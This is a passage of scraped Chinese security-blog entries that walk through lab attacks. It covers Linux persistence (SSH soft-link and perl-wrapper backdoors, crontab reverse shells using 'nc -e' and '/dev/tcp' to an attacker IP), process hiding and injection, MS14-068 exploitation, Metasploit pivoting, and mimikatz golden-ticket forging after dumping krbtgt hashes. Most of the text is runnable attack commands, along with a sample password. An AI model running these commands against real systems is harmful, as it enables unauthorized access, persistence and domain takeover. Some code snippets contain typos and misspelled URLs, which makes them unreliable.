<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/ssh/sshd_config |grep UsePAM (如果是NO则开启他)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822000327456.png"
                      alt="image-20230822000327456"
                ></p>
<p>创建后门监听</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=1022</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822002033009.png"
                      alt="image-20230822002033009"
                ></p>
<p>然后就可以指定端口登陆ssh</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@ip -p 1022</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822002251159.png"
                      alt="image-20230822002251159"
                ></p>
<p>我密码是随便乱输的，也能成功登陆，说明复现成功</p>
<p>删除后门</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -rf /tmp/su</span><br></pre></td></tr></table></figure></div>







<h2 id="SSH-wrapper后门"><a href="#SSH-wrapper后门" class="headerlink" title="SSH wrapper后门"></a>SSH wrapper后门</h2><h6 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h6><p>没有去开放额外的端口，只有对方开启的SSH服务，就能远程连接</p>
<h6 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h6><p>在肉鸡执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/sbin</span><br><span class="line">mv sshd ../bin</span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if (getpeername(STDIN)=~/^..4A/);&#x27; &gt;&gt;sshd</span><br><span class="line">echo &#x27;exec &#123;&quot;/usr/bin/sshd&quot;&#125;&quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br></pre></td></tr></table></figure></div>



<p>本地连接</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat STDIO TCP4:192.168.81.128:22,SOURCEPORT=13377</span><br></pre></td></tr></table></figure></div>

<p>上边的4A其实就是指13377端口</p>
<p>但如果要修改端口呢？</p>
<p>这边可以利用Python脚本来修改后门连接的端口</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">buffere=struct.pack(&#x27;&gt;16&#x27;,19526)</span><br><span class="line">print reprr(buffer)</span><br><span class="line"></span><br><span class="line">#回显 &#x27;\x00\x00LF&#x27;</span><br></pre></td></tr></table></figure></div>

<p>表示只要将命令中的4A替换成LF就可以了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">buffer =struct.pack(&#x27;&gt;l6&#x27;,13377)</span><br><span class="line">print buffer</span><br></pre></td></tr></table></figure></div>







<h2 id="SSH-Socks5代理"><a href="#SSH-Socks5代理" class="headerlink" title="SSH Socks5代理"></a>SSH Socks5代理</h2><p>一条命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -qTfnN -D 0.0.0.0:1080 root@localhost</span><br><span class="line"></span><br><span class="line">-q 静默执行</span><br><span class="line">-T 禁止分配伪终端</span><br><span class="line">-f 后台执行</span><br><span class="line">-n 把stdin重定向到/dev/null</span><br><span class="line">-N 不执行远程命令。用于转发端口</span><br><span class="line">-D 动态转发，接受SOCKS4和SOCKS5代理协议流量转发</span><br></pre></td></tr></table></figure></div>

<p>这个好像就是代理转发的ssh隧道</p>
<h2 id="crontab计划任务"><a href="#crontab计划任务" class="headerlink" title="crontab计划任务"></a>crontab计划任务</h2><h3 id="交互式创建计划任务"><a href="#交互式创建计划任务" class="headerlink" title="交互式创建计划任务"></a>交互式创建计划任务</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">*\59 * * * * nc -e /bin/bash 192.168.81.135 12345</span><br><span class="line">* * * * * /bin/bash -c &quot;/bin/sh -i &gt;&amp; /dev/tcp/192.168.81.135/12345 0&gt;&amp;1&quot;</span><br><span class="line">时间之间得空格，时间与指令之间也得空格</span><br></pre></td></tr></table></figure></div>

<p>kali这边设置监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822050433518.png"
                      alt="image-20230822050433518"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822051316100.png"
                      alt="image-20230822051316100"
                ></p>
<p>表示每隔59秒就执行一次指令，这边的IP地址是攻击机的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822051440577.png"
                      alt="image-20230822051440577"
                ></p>
<p>等待一分钟，这边就收到了反弹是shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822051410068.png"
                      alt="image-20230822051410068"
                ></p>
<p>另一个指令也是一样的道理</p>
<p>监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822051644028.png"
                      alt="image-20230822051644028"
                ></p>
<p>创建计划任务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822051616741.png"
                      alt="image-20230822051616741"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822051605216.png"
                      alt="image-20230822051605216"
                ></p>
<p>达到条件反弹shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822051635852.png"
                      alt="image-20230822051635852"
                ></p>
<h3 id="非交互方式"><a href="#非交互方式" class="headerlink" title="非交互方式"></a>非交互方式</h3><p>写入&#x2F;etc&#x2F;crontav文件中，和上面交互式写入不同的是需要加一个用户角色，以加入root为例</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;*/1 * * * * root nc -e /bin/bash 192.168.81.135 12345&quot; &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure></div>

<p>设置监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822052216245.png"
                      alt="image-20230822052216245"
                ></p>
<p>写入计划任务，以root用户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822052257011.png"
                      alt="image-20230822052257011"
                ></p>
<p>这个就是刚刚写入的计划任务代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822052554858.png"
                      alt="image-20230822052554858"
                ></p>
<p>反弹shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822052322412.png"
                      alt="image-20230822052322412"
                ></p>
<h2 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h2><h3 id="Mount（一般用这个就行了）"><a href="#Mount（一般用这个就行了）" class="headerlink" title="Mount（一般用这个就行了）"></a>Mount（一般用这个就行了）</h3><p>可以先查看进程的pid然后针对性的进行隐藏自己创建的恶意进程</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822053344520.png"
                      alt="image-20230822053344520"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /tmp/1 /proc/7030(PID)</span><br><span class="line">umount -v /proc/7030</span><br></pre></td></tr></table></figure></div>

<p>我这边隐藏个30615的进程</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822053800250.png"
                      alt="image-20230822053800250"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230822054054901.png"
                      alt="image-20230822054054901"
                ></p>
<p>报错</p>
<h3 id="Rootjit后门"><a href="#Rootjit后门" class="headerlink" title="Rootjit后门"></a>Rootjit后门</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#用户态LD_PRELOAD</span><br><span class="line">https://github.com/gianlucaborello/libprocesshider.git内#内核态LKM(不稳定)</span><br><span class="line">https://github.com/f0rb1dd3n/Reptile</span><br><span class="line">支持特定内核版本2.x/3.x/4.x</span><br></pre></td></tr></table></figure></div>





<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><h4 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gothub.com/gaffe23/linux-inject</span><br></pre></td></tr></table></figure></div>

<h4 id="without-ptrace"><a href="#without-ptrace" class="headerlink" title="without ptrace"></a>without ptrace</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/namazso/linux_injector</span><br></pre></td></tr></table></figure></div>

<p>有时候需要关闭ptrace保护才能实现进程注入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 0|sudo tee /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure></div>



<h2 id="服务后门"><a href="#服务后门" class="headerlink" title="服务后门"></a>服务后门</h2><p>apt劫持</p>
<p><a class="link"   href="https://gitub.com/0bfcgh0st/apt-get_update_hook" >https://gitub.com/0bfcgh0st/apt-get_update_hook <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>#sudo bash apt-get_update_hook.sh <ip> <port></p>
<h2 id="OpenSSH后门"><a href="#OpenSSH后门" class="headerlink" title="OpenSSH后门"></a>OpenSSH后门</h2><p>主要原理就是利用替换操作系统本身的ssh协议支撑软件openssh，重新安装自定义的openssh，达到记录账号密码，也可以采用万能密码连接</p>
]]></content>
  </entry>
  <entry>
    <title>补充：MS14-068</title>
    <url>/2024/02/29/%E8%A1%A5%E5%85%85%EF%BC%9AMS14-068/</url>
    <content><![CDATA[<h1 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ms14068咯的那个主要啊是通过伪造域管的TGT，将普通用户的权限提权为域管权限，以此来控制域控</p>
<p>只要再未打KB3011780补丁，并且再server 2000以上的域控中都可以利用</p>
<h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要一个域用户</span><br><span class="line">未打KB3011780补丁</span><br></pre></td></tr></table></figure></div>

<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>win2012 域控 hack-my&#x2F;administrator                 192.168.30.10</p>
<p>win7  域内主机 hack-my&#x2F;boy                                 192.168.30.30</p>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>首先需要查看一下这个系统是否打了补丁</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824160737506.png"
                      alt="image-20230824160737506"
                ></p>
<p>很明显没有</p>
<p>获取到用户的sid值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824160916037.png"
                      alt="image-20230824160916037"
                ></p>
<p>为了演示更直观，这边清除一下票据信息</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#cmd</span><br><span class="line">klist purge</span><br><span class="line">#mimikatz</span><br><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824161540490.png"
                      alt="image-20230824161540490"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824161821622.png"
                      alt="image-20230824161821622"
                ></p>
<p>接下来需要生成票据，这边直接使用工具生成</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u boy@hack-my.com -p Admin!@#45 -s S-1-5-21-3694414171-540705576-2292004015-1106 -d dc.hack-my.com</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824162210564.png"
                      alt="image-20230824162210564"
                ></p>
<p>发现在同目录下生成了一个票据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824162409465.png"
                      alt="image-20230824162409465"
                ></p>
<p>接下需要导入这个票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptc TGT_boy@hack-my.com.ccache</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824162927481.png"
                      alt="image-20230824162927481"
                ></p>
<p>查询是否导入成功</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#cmd</span><br><span class="line">klist</span><br><span class="line">#mimikatz</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure></div>

<p>不知道为什么cmd查的是空</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824163656523.png"
                      alt="image-20230824163656523"
                ></p>
<p>但是用mimikatz是查的出来的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824163605350.png"
                      alt="image-20230824163605350"
                ></p>
<p>尝试连接一下，发现是可以连接的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824163742758.png"
                      alt="image-20230824163742758"
                ></p>
<p>那就可以直接利用psexec获取shell权限，查询可知是管理员权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824164126032.png"
                      alt="image-20230824164126032"
                ></p>
<p>wmiexec的利用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824165617712.png"
                      alt="image-20230824165617712"
                ></p>
<p>利用smbexec是可以直接提权至system权限的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824165459540.png"
                      alt="image-20230824165459540"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>补充：MSF代理实现多层内网穿透</title>
    <url>/2024/02/29/%E8%A1%A5%E5%85%85%EF%BC%9AMSF%E4%BB%A3%E7%90%86%E5%AE%9E%E7%8E%B0%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h1 id="MSF代理实现多层内网穿透"><a href="#MSF代理实现多层内网穿透" class="headerlink" title="MSF代理实现多层内网穿透"></a>MSF代理实现多层内网穿透</h1><p>介绍一下内网的环境部署</p>
<p>kali：192.168.81.135</p>
<p>win7：192.168.81.166   192.168.30.30</p>
<p>win server2012：192.168.30.10</p>
<p>这边win7通外网，win2012不通</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824144423873.png"
                      alt="image-20230824144423873"
                ></p>
<p>首先先生成一个payload文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824140536299.png"
                      alt="image-20230824140536299"
                ></p>
<p>将文件单独一个文件夹，并且在这个文件夹中开启http服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824141028368.png"
                      alt="image-20230824141028368"
                ></p>
<p>目标win7访问下载这个payload</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824141200813.png"
                      alt="image-20230824141200813"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824141234087.png"
                      alt="image-20230824141234087"
                ></p>
<p>kali开启msf监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824141509943.png"
                      alt="image-20230824141509943"
                ></p>
<p>目标主机运行这个payload，攻击机收到shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824141608319.png"
                      alt="image-20230824141608319"
                ></p>
<p>设置路由</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure></div>

<p>这里的主要作用就是添加这个session的路由确保代理能正常连接</p>
<p>查看刚才设置的路由</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824142155080.png"
                      alt="image-20230824142155080"
                ></p>
<p>发现已经具有路由了，就挂起当前会话</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824142338421.png"
                      alt="image-20230824142338421"
                ></p>
<p>开启代理</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 0.0.0.0</span><br><span class="line">set srvport 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824142625829.png"
                      alt="image-20230824142625829"
                ></p>
<p>kali配置代理配置文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824143246259.png"
                      alt="image-20230824143246259"
                ></p>
<p>然后进行测试</p>
<p>这边可以看出可以扫描到目标主机的开放端口情况</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824143803077.png"
                      alt="image-20230824143803077"
                ></p>
<p>这边也可以正常连接到目标主机的3389</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824143637272.png"
                      alt="image-20230824143637272"
                ></p>
<p>至此大致流程也就结束了，对于更多层次的内网环境也是差不多的道理和流程这里就不演示了</p>
]]></content>
  </entry>
  <entry>
    <title>权限维持---域环境</title>
    <url>/2024/02/29/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%9F%9F%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h1 id="域控权限维持"><a href="#域控权限维持" class="headerlink" title="域控权限维持"></a>域控权限维持</h1><h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><p>在了解域控权限维持之前得先了解一下Kerberos的认证协议</p>
<h3 id="Kerberos协议认证流程"><a href="#Kerberos协议认证流程" class="headerlink" title="Kerberos协议认证流程"></a>Kerberos协议认证流程</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230404104911790.png"
                      alt="image-20230404104911790"
                ></p>
<ol>
<li>客户端向AS发起       AS_REQ</li>
<li>AS使用客户端的密码hash值进行解密，正确的话就会返回用krbtgt的NTLM Hash加密的TGT票据（其中包含PAC用于验证用户的权限，只有KDC能制作和查看PAC）     AS_REP</li>
<li>客户端用这TGT向TGS发起针对需要访问服务的TGS_REQ请求      TGS_REQ</li>
<li>TGS就会使用krbtgt的NTLM Hash对TGT进行解密，正确的话就会返回用服务的NTLM Hash加密的TGS票据（也就是ST），并且带上PAC（再认证过程中，不论用户有没有访问服务的权限，只要TGT正确都会放回ST）    TGS_REP</li>
<li>客户端利用ST去请求服务      AP_REQ</li>
<li>服务使用自己的NTLM Hash去解密ST，正确的话就会将其中的PAC给KDC解密，由KDC去判断该用户是否有访问服务的权限（如果没有设置PAC的话就不会去求证KDC，这样就导致了谁都可以去访问这个服务了，这就为了之后的白银票据提供了理论支持）    AP_REP</li>
</ol>
<p>至此认证过程就结束了</p>
<h4 id="记住要点"><a href="#记住要点" class="headerlink" title="记住要点"></a>记住要点</h4><p>kerberos RC4加密的NTLM密码哈希</p>
<p>（旧版本：DES+RC4；新版本是DES+AES-256）</p>
<p>登陆票据TGT向DC提供用户身份验证</p>
<p>Kerberos策略仅在创建TGT时检查</p>
<p>DC仅在TGT&gt;20分钟时验证用户账户</p>
<p>ST(TGS)PAC验证时可选的且很少见。这是KDC和应用晨序服务器之间的直接验证检查</p>
<p>1.服务器LSASS向DC的网络登陆服务（NRPC）发送PAC验证请求</p>
<p>2.如果它作为服务运行，则PAC验证时可选的（默认禁用）</p>
<p>3.如果服务作为系统运行，他会在PAC（计算机账户长期密钥）上执行服务器签名验证</p>
<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>黄金票据的利用过程是在kerberos认证过程第一阶段的AS认证过程中的</p>
<p>是krbtgt账户的hash签名和加密，使其成为有效的TGT票据</p>
<p>由于TGT有个特性就是在超过20分钟之前，域控的KDC服务时不会进行用户账户验证的，因此我们甚至可以用已经删除&#x2F;撤销的账户来申请黄金票据</p>
<p>krbtgt用户散列可以用于模拟任何用户，即使是来自非域计算机的任何权限</p>
<p>修改密码对本次的攻击没有影响</p>
<h6 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h6><p>黄金票据的制作需要一些前置条件，需要获取到一些域内信息</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要</span><br><span class="line">域名、域SID、krbtgt哈希值、伪造的用户</span><br></pre></td></tr></table></figure></div>

<p>获取域的sid值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820170725694.png"
                      alt="image-20230820170725694"
                ></p>
<p>查看所处域</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820170903730.png"
                      alt="image-20230820170903730"
                ></p>
<p>获取krbtgt用户的hash</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#mimikatz</span><br><span class="line">privilege::debug   提权</span><br><span class="line">lsadump::lsa /patch   获取krbtgt用户的hash，域的sid值</span><br><span class="line">lsadum::lsa /patch /user:krbtgt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820171145283.png"
                      alt="image-20230820171145283"
                ></p>
<p>我这边这条指令报错，并且会重启主机，不清楚什么原因</p>
<p>换另一条指令执行查看所有用户的hash</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:hack-my.com /all /csv</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820172403655.png"
                      alt="image-20230820172403655"
                ></p>
<p>查看到krbtgt的hash值为3240a50b789addc29388d03988e89209</p>
<p>然后就可以利用得到的信息，利用mimikatz生成黄金票据并且导入（其他域内主机中执行）</p>
<p>为了演示不受其他条件干扰，我这边先清除一下历史票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Kerberos::purge</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820172816893.png"
                      alt="image-20230820172816893"
                ></p>
<p>然后生成票据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /admin:boy（这个可以随便取） /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /krbtgt:3240a50b789addc29388d03988e89209 /ticket:1.kirbi</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820173653049.png"
                      alt="image-20230820173653049"
                ></p>
<p>将票据导入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt 1.kirbi</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820173709928.png"
                      alt="image-20230820173709928"
                ></p>
<p>然后就可以连接到域控主机了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\ip\c$</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230820173517943.png"
                      alt="image-20230820173517943"
                ></p>
<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>白银票据是利用Kerberos认证的第二阶段TGS生成ST</p>
<p>他是使用该账户运行的服务的服务账户的NTLM哈希加密和签名生成的</p>
<p>服务很少去检查PAC（特权属性证书）</p>
<p>TGS将只允许访问服务本身</p>
<p>合理的有效时间（电脑账户默认30天）</p>
<h3 id="常见服务"><a href="#常见服务" class="headerlink" title="常见服务"></a>常见服务</h3><p>CIFS 访问共享文件</p>
<p>HOST 系统操作（创建计划任务等）</p>
<p>HIST+RPCSS远程wmic命令执行</p>
